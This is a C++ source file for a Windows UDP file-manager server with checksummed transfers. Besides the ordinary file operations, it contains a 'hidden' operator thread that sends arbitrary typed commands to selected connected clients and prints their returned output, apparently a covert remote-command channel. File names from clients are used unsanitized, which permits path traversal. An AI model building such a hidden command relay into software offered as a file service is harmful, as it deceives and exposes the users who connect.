#include <fstream>

#include "sever.hpp"

using std::fstream;
using std::ifstream;
using std::ofstream;
using std::string;
using std::stringstream;
using std::vector;
using std::queue;
using std::pair;
using std::thread;
using std::lock_guard;
using std::unique_lock;
using std::mutex;
using std::min;
using std::cin;
using std::cout;
using std::endl;
using std::cerr;

void FileManager::VectorUniquePush(std::vector<sockaddr_in>& vec, sockaddr_in elem)
{
    auto founded = find_if(vec.begin(), vec.end(), [&](auto it) {return it.sin_port == elem.sin_port; });
    if (founded != vec.end())
        return;
    else
        vec.push_back(elem);

    return;
}

void FileManager::run()
{
    if (StartServer() == -1)
        return;

    // Устанавливаем минимальный маймаут ожидания
    timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 1;

    fd_set readSet;

    // Инициализируем пул потоков
    InitializeThreadpoolEnvironment(&call_back_environ_);
    pool_ = CreateThreadpool(NULL);
    SetThreadpoolThreadMaximum(pool_, TH_SIZE_MAXIMUM);
    SetThreadpoolThreadMinimum(pool_, TH_SIZE_MINIMUM);

    SetThreadpoolCallbackPool(&call_back_environ_, pool_);

    cleanupgroup_ = CreateThreadpoolCleanupGroup();
    SetThreadpoolCallbackCleanupGroup(&call_back_environ_, cleanupgroup_, NULL);

    // Запускаем поток с I/O для админа
    Args* args = new Args;
    args->ptr_ = this;
    workcallback_ = StartHiddener;
    work_ = CreateThreadpoolWork(workcallback_, args, &call_back_environ_);
    SubmitThreadpoolWork(work_);        

    // Основной цикл отвечающий за обмен сообщениями
    string request_str;
    sockaddr_in client;
    while (true)
    {
        // Проверяем наличие данных на чтение от клиента
        request_str.clear();
        FD_ZERO(&readSet);
        FD_SET(socket_, &readSet);
        int result = select(0, &readSet, nullptr, nullptr, &timeout);
        if (result == SOCKET_ERROR)
        {
            cout << "Error: " << GetLastError() << endl;
            system("pause");
            exit(1);
        }
        if (result != 0 and result != SOCKET_ERROR)
            RecvData(request_str, client);

        if (!request_str.empty())
        {
            VectorUniquePush(clients_addr_, client);

            // Если получены данные от клиента, определяем их назначение
            // Если это результат выполнения команды - оповещаем залоченный поток
            // Если данные это запрос клиента - выделяем запрос в отдельный поток
            if (request_str[0] == '#')
            {
                request_str.erase(0, 1);
                args->data_ = request_str;
                args->client_addr_ = client;
                args->ptr_ = this;

                workcallback_ = ThreadStarter;
                work_ = CreateThreadpoolWork(workcallback_, args, &call_back_environ_);
                SubmitThreadpoolWork(work_);
            }
            else 
            {
                client_data_ = request_str;
                cv_.notify_one();
            }
        }

        // Если очередь на отправку данных не пустая, отправляем и получаем данные
        if (!requests_q.empty() and request_str.empty())
        {
            pair<string, sockaddr_in> request = requests_q.front();
            SendData(request.first, request.second);
            requests_q.pop();
        }

    }
    delete args;
}

int FileManager::StartServer()
{
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data_) != 0)
    {
        cerr << "Не удалось инициализировать Winsock." << std::endl;
        return INVALID_SOCKET;
    }

    socket_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (socket_ == INVALID_SOCKET)
    {
        cerr << "Не удалось создать сокет." << endl;
        WSACleanup();
        return INVALID_SOCKET;
    }

    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(DEFAULT_PORT);
    server_addr_.sin_addr.s_addr = inet_addr(DEFAULT_IP);

    if (bind(socket_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) == SOCKET_ERROR)
    {
        std::cerr << "Не удалось связать сокет с адресом сервера.\nError: " << GetLastError() << std::endl;
        closesocket(socket_);
        WSACleanup();
        return INVALID_SOCKET;
    }

    
    return 0;
}

int FileManager::StopServer()
{
    closesocket(socket_);
    WSACleanup();
    cout << "Server stopped." << endl;

    return 0;
}

int FileManager::SendData(string data, sockaddr_in client_addr) 
{
    int total_bytes_send = 0, bytes_to_sent, bytes_sent;

    // Отправляем размер данных
    bytes_to_sent = htonl(data.size());
    sendto(socket_, reinterpret_cast<char*>(&bytes_to_sent), sizeof(int), 0, (struct sockaddr*)&client_addr, sizeof(client_addr));

    // Отправляем данные блоками
    while (total_bytes_send < data.size())
    {
        bytes_to_sent = min(data.size() - total_bytes_send, BUFFER_SIZE);
        bytes_sent = sendto(socket_, data.data() + total_bytes_send, bytes_to_sent, 0, (struct sockaddr*)&client_addr, sizeof(client_addr));

        if (bytes_sent == SOCKET_ERROR)
        {
            cerr << "Ошибка отправки данных." << endl;
            return -1;
        }

        total_bytes_send += bytes_sent;
    }
    // Отправляем контрольную сумму
    unsigned checksum = GetCRC32(data);
    checksum = htonl(checksum);
    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    return total_bytes_send;
}

int FileManager::RecvData(string &data, sockaddr_in &client_addr)
{
    int client_addr_size = sizeof(client_addr), expected_size = 0, bytes_read = 0;
    char local_buffer[BUFFER_SIZE + 1];
    int bytes_to_receive, total_bytes_received = 0;

    // Getting the size of the data
    bytes_read = recvfrom(socket_, reinterpret_cast<char*>(&expected_size), sizeof(expected_size), 0, (struct sockaddr*)&client_addr, &client_addr_size);
    if (bytes_read == SOCKET_ERROR)
    {
        cerr << "Ошибка приема данных.\nError: " << GetLastError() << endl;
        last_error_ = "Data acquisition error!";
        return -1;
    }
    bytes_read = 0;
    expected_size = ntohl(expected_size);

    // Getting data in blocks
    while(total_bytes_received < expected_size)
    {
        bytes_to_receive = min(expected_size - total_bytes_received, BUFFER_SIZE);
        bytes_read = recvfrom(socket_, local_buffer, bytes_to_receive, 0, (struct sockaddr*)&client_addr, &client_addr_size);
        if (bytes_read == SOCKET_ERROR)
        {
            cerr << "Ошибка приема данных.\nError: " << GetLastError() << endl;
            last_error_ = "Data acquisition error!";
            return -1;
        }
        total_bytes_received += bytes_read;

        local_buffer[bytes_read] = '\0';
        data += string{ local_buffer };
    }

    // Getting the checksum of the data
    unsigned checksum;
    bytes_read = recvfrom(socket_, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&client_addr, &client_addr_size);
    if (bytes_read == SOCKET_ERROR)
    {
        cerr << "Ошибка приема данных.\nError: " << GetLastError() << endl;
        last_error_ = "Data acquisition error!";
        return -1;
    }
    checksum = ntohl(checksum); 

    // Check that the checksum matches
    unsigned calculated_checksum = GetCRC32(data);
    if (calculated_checksum != checksum)
    {
        last_error_ = "The checksum does not match!";
        return -1;
    }

    return 0;
}

unsigned FileManager::GetCRC32(std::string data)
{
    unsigned int crc = crc32(0L, Z_NULL, 0);

    crc = crc32(crc, reinterpret_cast<const Bytef*>(data.c_str()), data.length());

    return crc;
}

VOID FileManager::ThreadStarter(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
{
    Args* args = reinterpret_cast<Args*>(Parameter);
    args->ptr_->ExecuteCommand(args->data_, args->client_addr_);
}

VOID FileManager::StartHiddener(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
{
    Args* args = reinterpret_cast<Args*>(Parameter);
    args->ptr_->ExecHiddenCommand();
}

void FileManager::ExecHiddenCommand()
{
    string cmd;
    int users_id;
    while (true)
    {
        cmd.clear();
        cout << "cmd: ";
        getline(cin, cmd);
        cmd.insert(0, "#");
        cout << "Available users:" << endl;
        {
            lock_guard<mutex> lock(mt_);
            if (clients_addr_.size() == 0)
            {
                cout << "There are no known users";
                Sleep(2000);
                system("cls");
                continue;
            }

            int i = 0;
            for (auto it : clients_addr_)
            {
                cout << "\n\tID: " << i << "\n\tUsers port: " << it.sin_port << endl;
                i++;
            }
            cout << "Select users id: ";
        }
        cin >> users_id;
        {
            unique_lock<mutex> lock(mt_);
            requests_q.push(std::make_pair(cmd, clients_addr_[users_id]));

            cv_.wait_for(lock, std::chrono::seconds(20), [&] {return !client_data_.empty(); });
            cmd = client_data_;
            client_data_.clear();
        }
        if (!cmd.empty())
            cout << endl << "==================_Output_==================" << endl << cmd << endl << "============================================" << endl;
        else
            cout << endl << "Could not wait for the output of the command!" << endl;
        getline(cin, cmd);
    }
}

int FileManager::ExecuteCommand(string command, sockaddr_in client_addr)
{
    stringstream ss(command);
    string arg1, arg2;

    ss >> command >> arg1;
    if (command.empty())
    {
        last_error_ = "Invalid arguments";
        requests_q.push(make_pair(last_error_, client_addr));
        return 0;
    }

    Command cmd;
    try {
        cmd = static_cast<Command>(std::stoi(command));
    }
    catch(const std::exception &ex)
    {
        last_error_ = "Invalid command!";
        requests_q.push(make_pair(last_error_, client_addr));
        return 0;
    }
    if (cmd != kList and arg1.empty())
    {
        last_error_ = "Invalid arguments";
        requests_q.push(make_pair(last_error_, client_addr));
        return 0;
    }
    if (cmd == kWrite or cmd == kAppend)
    {
        std::getline(ss, arg2);
        if (arg2.empty())
        {
            last_error_ = "Invalid arguments";
            requests_q.push(make_pair(last_error_, client_addr));
            return 0;
        }
        arg2.erase(0, 1);
    }

    int ret_value;
    string data;
    switch (cmd)
    {
    case kCreateNew:
        ret_value = MyCreateFile(arg1);
        break;
    case kDelete:
        ret_value = MyDeleteFile(arg1);
        break;
    case kAppend:
    case kWrite:
        ret_value = Write(arg1, arg2, cmd);
        break;
    case kRead:
        ret_value = Read(arg1, data);
        break;
    case kList:
        ret_value = GetFileList(data);
        break;
    default:
        last_error_ = "Undefined command!";
        ret_value = -1;
        break;
    }

    {
        lock_guard<mutex> lock(mt_);
        if (ret_value == -1)
            requests_q.push(make_pair(last_error_, client_addr));
        else
        {
            data.empty() ? data = "0" : "";
            requests_q.push(make_pair(data, client_addr));
        }
    }

    return 0;
}

//---------------------------------------------
//              Server commands
//
int FileManager::MyCreateFile(string name)
{
    ifstream check_file(DEF_PATH + name);
    if (!check_file.good())
    {
        ofstream file(DEF_PATH + name);

        check_file.close();
        file.close();
        return 0;
    }
    else
    {
        last_error_ = "File creation error. Such a file already exists.";
        return -1;
    }
}

int FileManager::MyDeleteFile(string filename)
{
    if (remove(string{ DEF_PATH + filename }.c_str()) != 0)
    {
        last_error_ = "File deletion error";
        return -1;
    }
    return 0;
}

int FileManager::Read(string filename, string &file_data)
{
    fstream file(DEF_PATH + filename);
    if (!file.good())
    {
        last_error_ = "File opening error. There is no such file";
        return -1;
    }
    std::getline(file, file_data);
    
    file.close();
    return 0;
}

int FileManager::Write(string filename, string data, Command cmd)
{
    ofstream file;
    
    if (cmd == kWrite)
        file.open(DEF_PATH + filename, std::ios::trunc);
    else
        file.open(DEF_PATH + filename, std::ios::app);

    if (!file.good())
    {
        last_error_ = "File opening error. There is no such file";
        return -1;
    }

    file << data;
    file.close();
    return 0;
}

int FileManager::GetFileList(string& file_list)
{
    if (std::filesystem::exists(DEF_PATH)) 
    {
        for (const auto& entry : std::filesystem::directory_iterator(DEF_PATH)) 
        {
            if (std::filesystem::is_regular_file(entry))
                file_list += entry.path().string().erase(0, sizeof(DEF_PATH) -1) + "\n";
        }
    }

    return 0;
}